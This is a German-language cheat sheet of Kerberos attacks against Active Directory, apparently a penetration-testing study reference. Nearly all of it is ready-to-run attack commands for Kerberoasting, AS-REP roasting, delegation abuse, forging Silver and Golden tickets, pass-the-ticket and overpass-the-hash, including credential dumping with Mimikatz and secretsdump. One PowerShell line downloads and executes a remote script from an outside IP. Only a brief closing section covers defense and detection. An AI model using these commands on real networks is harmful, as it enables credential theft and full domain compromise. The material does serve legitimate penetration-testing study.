# Kerberos Attacks - Complete Guide

## Table of Contents
1. [Kerberoasting](#1-kerberoasting)
2. [AS-REP Roasting (Pre-Authentication Disabled)](#2-as-rep-roasting)
3. [Unconstrained Delegation](#3-unconstrained-delegation)
4. [Constrained Delegation](#4-constrained-delegation)
5. [Resource-Based Constrained Delegation (RBCD)](#5-resource-based-constrained-delegation)
6. [Silver Ticket](#6-silver-ticket)
7. [Golden Ticket](#7-golden-ticket)
8. [Pass-the-Ticket](#8-pass-the-ticket)
9. [Overpass-the-Hash](#9-overpass-the-hash)

---

## 1. Kerberoasting

### 1.1 Theory

**Was ist Kerberoasting?**
- Service Accounts mit SPNs (Service Principal Names) haben Kerberos TGS-Tickets
- Diese TGS-Tickets sind mit dem Passwort-Hash des Service Accounts verschlüsselt
- Jeder authentifizierte Domain-User kann TGS-Tickets für SPNs anfordern
- Die Tickets können offline mit Tools wie Hashcat/John geknackt werden

**Warum funktioniert es?**
- Service Accounts haben oft schwache Passwörter
- TGS-Tickets nutzen RC4-HMAC oder AES128/256 Verschlüsselung
- Keine Authentifizierung nötig - nur valider Domain User

---

### 1.2 SPN Enumeration

#### Von Linux (Impacket)

```bash
# SPNs auflisten (ohne Hashes anzufordern)
impacket-GetUserSPNs DOMAIN/username:password -dc-ip DC_IP

# Mit Proxychains
proxychains impacket-GetUserSPNs oscp.local/user:pass -dc-ip 10.10.10.10

# Mit Hash (Pass-the-Hash)
impacket-GetUserSPNs DOMAIN/username -hashes :NTHASH -dc-ip DC_IP

# Nur auflisten ohne Request
impacket-GetUserSPNs DOMAIN/username:password -dc-ip DC_IP -no-preauth
```

#### Von Windows (PowerView)

```powershell
# PowerView importieren
Import-Module .\PowerView.ps1

# Alle SPNs finden
Get-DomainUser -SPN

# Detaillierte SPN Info
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname

# Nur bestimmte SPNs (z.B. MSSQL)
Get-DomainUser -SPN | Where-Object {$_.serviceprincipalname -match "MSSQLSvc"}
```

#### Von Windows (AD Module)

```powershell
# AD Module verwenden
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Mit Details
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName,PasswordLastSet | Select-Object Name,ServicePrincipalName,PasswordLastSet
```

---

### 1.3 Hash Extraction

#### Impacket GetUserSPNs (Linux)

```bash
# Hashes direkt anfordern
impacket-GetUserSPNs DOMAIN/username:password -dc-ip DC_IP -request

# Mit Output File (sauber formatiert)
impacket-GetUserSPNs DOMAIN/username:password -dc-ip DC_IP -request -outputfile kerberos_hashes.txt

# Über Proxychains
proxychains impacket-GetUserSPNs domain.local/user:pass -dc-ip dc01.domain.local -request -outputfile hashes.txt

# Nur Hashes extrahieren (grep)
impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC_IP -request | grep '^\$krb5tgs' > hashes.txt

# Mit Pass-the-Hash
impacket-GetUserSPNs DOMAIN/username -hashes :NTHASH -dc-ip DC_IP -request -outputfile hashes.txt
```

#### Rubeus (Windows)

```powershell
# Rubeus Kerberoast
.\Rubeus.exe kerberoast

# Output in Hashcat format
.\Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt

# Nur spezifische User
.\Rubeus.exe kerberoast /user:sqlsvc

# Mit AES256 Encryption (statt RC4)
.\Rubeus.exe kerberoast /tgtdeleg

# Nur schwache Verschlüsselung (RC4)
.\Rubeus.exe kerberoast /rc4opsec
```

#### Invoke-Kerberoast (PowerShell)

```powershell
# PowerShell Script laden
IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-Kerberoast.ps1')

# Kerberoast ausführen
Invoke-Kerberoast -OutputFormat Hashcat

# Zu Datei speichern
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -FilePath hashes.txt

# Mit spezifischem User
Invoke-Kerberoast -Identity sqlsvc -OutputFormat Hashcat
```

---

### 1.4 Hash Cracking

#### Hashcat

```bash
# Standard Kerberoast (RC4-HMAC - Mode 13100)
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# Mit Rules für bessere Erfolgsrate
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# AES256 Kerberoast (Mode 19700)
hashcat -m 19700 hashes.txt /usr/share/wordlists/rockyou.txt

# AES128 Kerberoast (Mode 19600)
hashcat -m 19600 hashes.txt /usr/share/wordlists/rockyou.txt

# Mit GPU (schneller)
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force -O

# Gecrackte Passwörter anzeigen
hashcat -m 13100 hashes.txt --show
```

#### John the Ripper

```bash
# Standard Crack
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Mit Rules
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt

# Gecrackte anzeigen
john --show hashes.txt

# Status checken
john --status
```

**Hash Format Beispiel:**
```
$krb5tgs$23$*sqlsvc$DOMAIN.LOCAL$MSSQLSvc/sql01.domain.local:1433*$a1b2c3d4e5f6...
$krb5tgs$23$*websvc$DOMAIN.LOCAL$HTTP/web01.domain.local*$f6e5d4c3b2a1...
```

---

### 1.5 Post-Exploitation

```bash
# Mit gecracketem Password authentifizieren
crackmapexec smb 10.10.10.10 -u sqlsvc -p 'Password123!'

# PSExec Shell
psexec.py DOMAIN/sqlsvc:Password123!@10.10.10.10

# WMI Exec
wmiexec.py DOMAIN/sqlsvc:Password123!@10.10.10.10

# Evil-WinRM (wenn WinRM aktiviert)
evil-winrm -i 10.10.10.10 -u sqlsvc -p 'Password123!'
```

---

## 2. AS-REP Roasting

### 2.1 Theory

**Was ist AS-REP Roasting?**
- Manche User haben "Do not require Kerberos preauthentication" aktiviert
- Für diese User kann JEDER (auch ohne Credentials) AS-REP Tickets anfordern
- AS-REP ist mit dem User's Passwort-Hash verschlüsselt
- Kann offline geknackt werden (wie Kerberoasting)

**User Attribute:**
- `DONT_REQ_PREAUTH` (UserAccountControl Flag)

---

### 2.2 Enumeration

#### Von Linux (Impacket)

```bash
# Vulnerable Users finden (ohne Credentials!)
impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt

# Mit einem gültigen User
impacket-GetNPUsers DOMAIN/username:password -dc-ip DC_IP -request

# Mit Pass-the-Hash
impacket-GetNPUsers DOMAIN/username -hashes :NTHASH -dc-ip DC_IP -request

# Nur einen spezifischen User prüfen
impacket-GetNPUsers DOMAIN/vulnerable_user -no-pass -dc-ip DC_IP

# Über Proxychains
proxychains impacket-GetNPUsers oscp.local/ -dc-ip 10.10.10.10 -usersfile users.txt -format hashcat
```

#### Von Windows (PowerView)

```powershell
# Vulnerable Users finden
Get-DomainUser -PreauthNotRequired

# Mit Details
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname,useraccountcontrol

# Prüfen ob User vulnerable ist
Get-DomainUser -Identity username | Select-Object samaccountname,useraccountcontrol
```

#### Von Windows (AD Module)

```powershell
# AD Module
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

# Mit Details
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth,PasswordLastSet | Select-Object Name,DoesNotRequirePreAuth,PasswordLastSet
```

#### Von Windows (Rubeus)

```powershell
# AS-REP Roasting mit Rubeus
.\Rubeus.exe asreproast

# Output in Hashcat format
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# Nur spezifischer User
.\Rubeus.exe asreproast /user:vulnerable_user
```

---

### 2.3 Hash Extraction & Cracking

#### Hash Format
```
$krb5asrep$23$vulnerable_user@DOMAIN.LOCAL:hash_data_here...
```

#### Hashcat Cracking

```bash
# AS-REP Roast (Mode 18200)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# Mit Rules
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Gecrackte anzeigen
hashcat -m 18200 asrep_hashes.txt --show
```

#### John the Ripper

```bash
# Crack mit John
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt

# Gecrackte anzeigen
john --show asrep_hashes.txt
```

---

### 2.4 Exploitation Without Credentials

**Userlist erstellen:**
```bash
# Aus LDAP Enum
enum4linux -U 10.10.10.10 | grep 'user:' | cut -d: -f2 | tr -d '[]' > users.txt

# Aus RID Cycling
crackmapexec smb 10.10.10.10 --rid-brute > users.txt

# Manuelle Liste
cat > users.txt << EOF
administrator
guest
krbtgt
vulnerable_user
john.doe
EOF
```

**AS-REP Roasting ohne Credentials:**
```bash
# Mit usersfile
impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -usersfile users.txt -format hashcat -outputfile asrep.txt

# Einzelne User testen
impacket-GetNPUsers DOMAIN/john.doe -no-pass -dc-ip DC_IP
```

---

## 3. Unconstrained Delegation

### 3.1 Theory

**Unconstrained Delegation:**
- Server/Computer kann sich als beliebiger User bei JEDEM Service authentifizieren
- TGT des Users wird im RAM des Servers gespeichert
- Wenn Admin sich auf Server einloggt → TGT kann extrahiert werden
- Mit TGT → Pass-the-Ticket Angriff

---

### 3.2 Enumeration

#### PowerView

```powershell
# Computer mit Unconstrained Delegation finden
Get-DomainComputer -Unconstrained

# Mit Details
Get-DomainComputer -Unconstrained | Select-Object name,useraccountcontrol

# User mit Unconstrained Delegation
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
```

#### AD Module

```powershell
# Computer finden
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation

# User finden
Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
```

---

### 3.3 Exploitation

```powershell
# 1. Admin muss sich auf Unconstrained Delegation Server einloggen
# 2. Rubeus TGT extrahieren
.\Rubeus.exe triage

# Alle Tickets dumpen
.\Rubeus.exe dump

# TGT in Mimikatz importieren
.\mimikatz.exe
sekurlsa::tickets /export

# Oder direkt mit Rubeus
.\Rubeus.exe dump /luid:0x123456 /nowrap

# Pass-the-Ticket (siehe Sektion 8)
```

---

## 4. Constrained Delegation

### 4.1 Theory

**Constrained Delegation:**
- Server kann sich NUR als spezifischer User bei BESTIMMTEN Services authentifizieren
- `msDS-AllowedToDelegateTo` Attribut definiert erlaubte Services
- Angreifer kann beliebigen User (inkl. Domain Admin) impersonieren

---

### 4.2 Enumeration

```powershell
# PowerView
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# Mit Details
Get-DomainComputer -TrustedToAuth | Select-Object name,msds-allowedtodelegateto

# AD Module
Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

---

### 4.3 Exploitation (Rubeus)

```powershell
# S4U2Self + S4U2Proxy Angriff
# Impersonate Administrator zu CIFS Service

# 1. TGT für Constrained Delegation Account holen
.\Rubeus.exe asktgt /user:websvc /password:Password123! /domain:domain.local /dc:dc01.domain.local

# 2. S4U Angriff
.\Rubeus.exe s4u /ticket:TGT_BASE64 /impersonateuser:Administrator /msdsspn:cifs/server01.domain.local /ptt

# 3. Jetzt als Administrator auf server01 zugreifen
dir \\server01\c$
```

---

## 5. Resource-Based Constrained Delegation

### 5.1 Theory

**RBCD:**
- Seit Windows Server 2012
- `msDS-AllowedToActOnBehalfOfOtherIdentity` Attribut
- Ressource (z.B. Computer) definiert WER delegation verwenden darf
- Wenn Angreifer `WriteProperty` auf Computer hat → RBCD konfigurieren

---

### 5.2 Exploitation

```powershell
# 1. Computer Account erstellen (wenn möglich)
import-module powermad
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# 2. RBCD konfigurieren
$ComputerSid = Get-DomainComputer FAKE01 -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer TARGET01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# 3. S4U mit Rubeus
.\Rubeus.exe s4u /user:FAKE01$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target01.domain.local /ptt
```

---

## 6. Silver Ticket

### 6.1 Theory

**Silver Ticket:**
- Forge TGS-Ticket für spezifischen Service
- Benötigt: Service Account NTLM Hash oder AES Key
- Funktioniert für einen Service (z.B. CIFS, HTTP, MSSQL)
- Keine Kommunikation mit DC nötig

---

### 6.2 Creation (Mimikatz)

```powershell
# Silver Ticket erstellen
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server01.domain.local /service:cifs /rc4:SERVICE_NTLM_HASH /ptt

# Mit AES256
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server01.domain.local /service:cifs /aes256:AES_KEY /ptt

# Verschiedene Services:
# CIFS: /service:cifs
# HTTP: /service:http
# MSSQL: /service:mssqlsvc
# LDAP: /service:ldap
```

---

### 6.3 Creation (Impacket)

```bash
# ticketer.py
impacket-ticketer -nthash SERVICE_NTLM_HASH -domain-sid S-1-5-21-... -domain domain.local -spn cifs/server01.domain.local Administrator

# Ticket nutzen
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain.local/Administrator@server01.domain.local
```

---

## 7. Golden Ticket

### 7.1 Theory

**Golden Ticket:**
- Forge TGT (Ticket Granting Ticket)
- Benötigt: krbtgt Account NTLM Hash oder AES Key
- Vollständige Domain-Kontrolle
- Ticket kann für JEDEN User erstellt werden
- Lange Gültigkeit (Standard: 10 Jahre)

---

### 7.2 Prerequisites

```bash
# 1. Domain SID herausfinden
impacket-lookupsid domain.local/user:pass@dc01.domain.local

# 2. krbtgt Hash bekommen (nach DC Compromise)
impacket-secretsdump domain.local/Administrator:pass@dc01.domain.local | grep krbtgt
```

---

### 7.3 Creation (Mimikatz)

```powershell
# Golden Ticket erstellen
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-DOMAIN-SID /krbtgt:KRBTGT_NTLM_HASH /ptt

# Mit AES256 (besser)
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /aes256:KRBTGT_AES256_KEY /ptt

# Custom Validity (20 Jahre)
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /startoffset:0 /endin:10512000 /renewmax:10512000 /ptt

# Ticket speichern
kerberos::golden /user:FakeAdmin /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ticket:golden.kirbi
```

---

### 7.4 Creation (Impacket)

```bash
# Golden Ticket mit ticketer.py
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-DOMAIN-SID -domain domain.local FakeAdmin

# Ticket verwenden
export KRB5CCNAME=FakeAdmin.ccache

# DCSync durchführen
impacket-secretsdump -k -no-pass domain.local/FakeAdmin@dc01.domain.local

# PSExec
impacket-psexec -k -no-pass domain.local/FakeAdmin@dc01.domain.local
```

---

## 8. Pass-the-Ticket

### 8.1 Ticket Extraction (Mimikatz)

```powershell
# Alle Tickets exportieren
sekurlsa::tickets /export

# Spezifischer Ticket
kerberos::list
kerberos::ptt ticket.kirbi
```

---

### 8.2 Ticket Injection

#### Mimikatz

```powershell
# Ticket importieren
kerberos::ptt ticket.kirbi

# Tickets listen
kerberos::list

# Tickets löschen
kerberos::purge
```

#### Rubeus

```powershell
# Ticket importieren
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Base64 Ticket importieren
.\Rubeus.exe ptt /ticket:BASE64_BLOB

# Von Datei
.\Rubeus.exe ptt /ticket:C:\temp\ticket.kirbi
```

---

### 8.3 Ticket Conversion

```bash
# .kirbi zu .ccache (für Linux)
impacket-ticketConverter ticket.kirbi ticket.ccache

# .ccache zu .kirbi
impacket-ticketConverter ticket.ccache ticket.kirbi

# Ticket verwenden auf Linux
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass domain/user@target
```

---

## 9. Overpass-the-Hash

### 9.1 Theory

**Overpass-the-Hash (Pass-the-Key):**
- NTLM Hash oder AES Key → Kerberos TGT anfordern
- Kein NTLM Authentication nötig
- Funktioniert auch wenn NTLM deaktiviert ist

---

### 9.2 Exploitation (Mimikatz)

```powershell
# Mit NTLM Hash
sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:NTLM_HASH /run:powershell

# Mit AES256 Key (besser, weniger Detection)
sekurlsa::pth /user:Administrator /domain:domain.local /aes256:AES256_KEY /run:powershell

# In neuer PowerShell Session
klist  # Sollte leer sein
dir \\dc01\c$  # Erzeugt TGT
klist  # Jetzt TGT sichtbar
```

---

### 9.3 Exploitation (Rubeus)

```powershell
# Mit RC4 (NTLM)
.\Rubeus.exe asktgt /user:Administrator /domain:domain.local /rc4:NTLM_HASH /ptt

# Mit AES256
.\Rubeus.exe asktgt /user:Administrator /domain:domain.local /aes256:AES256_KEY /ptt

# TGT anfordern und speichern
.\Rubeus.exe asktgt /user:Administrator /domain:domain.local /rc4:HASH /outfile:tgt.kirbi
```

---

## 10. Quick Reference Table

| Attack | Required | Tool | Offline Crackable | Domain Admin? |
|--------|----------|------|-------------------|---------------|
| Kerberoasting | Valid User | GetUserSPNs, Rubeus | ✅ Yes | ❌ No |
| AS-REP Roast | None / Valid User | GetNPUsers, Rubeus | ✅ Yes | ❌ No |
| Unconstrained Delegation | Local Admin on delegated server | Rubeus, Mimikatz | ❌ No | ⚠️ Possible |
| Constrained Delegation | Delegated account creds | Rubeus | ❌ No | ⚠️ Possible |
| RBCD | WriteProperty on Computer | PowerView, Rubeus | ❌ No | ⚠️ Possible |
| Silver Ticket | Service Account Hash | Mimikatz, ticketer | ❌ No | ❌ No |
| Golden Ticket | krbtgt Hash | Mimikatz, ticketer | ❌ No | ✅ Yes |
| Pass-the-Ticket | Valid Ticket | Mimikatz, Rubeus | ❌ No | ⚠️ Depends |
| Overpass-the-Hash | NTLM/AES Key | Mimikatz, Rubeus | ❌ No | ⚠️ Depends |

---

## 11. Defense & Detection

### 11.1 Kerberoasting Protection

- Starke Passwörter für Service Accounts (25+ Zeichen)
- Managed Service Accounts (MSA/gMSA) verwenden
- SPNs nur wo nötig vergeben
- AES Encryption erzwingen (RC4 deaktivieren)

### 11.2 AS-REP Roasting Protection

- Pre-Authentication NICHT deaktivieren
- Regelmäßig nach vulnerable accounts scannen:
  ```powershell
  Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
  ```

### 11.3 Detection

**Event IDs zu monitoren:**
- 4769: Kerberos TGS Request (viele Requests = Kerberoasting)
- 4768: Kerberos TGT Request (AS-REP Roasting)
- 4624: Logon with Ticket (Pass-the-Ticket)
- 4672: Special privileges assigned (Golden Ticket)

---

## 12. Tools Overview

| Tool | Platform | Purpose |
|------|----------|---------|
| Impacket GetUserSPNs | Linux | Kerberoasting |
| Impacket GetNPUsers | Linux | AS-REP Roasting |
| Rubeus | Windows | Alle Kerberos Attacks |
| Mimikatz | Windows | Ticket Manipulation |
| PowerView | Windows | Enumeration |
| Hashcat | Linux/Windows | Hash Cracking |
| ticketer.py | Linux | Golden/Silver Ticket Creation |

---

## 13. Resources

- **HackTricks Kerberos**: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberos-authentication
- **Rubeus GitHub**: https://github.com/GhostPack/Rubeus
- **PowerView**: https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
- **Impacket**: https://github.com/fortra/impacket
- **ired.team Kerberos**: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse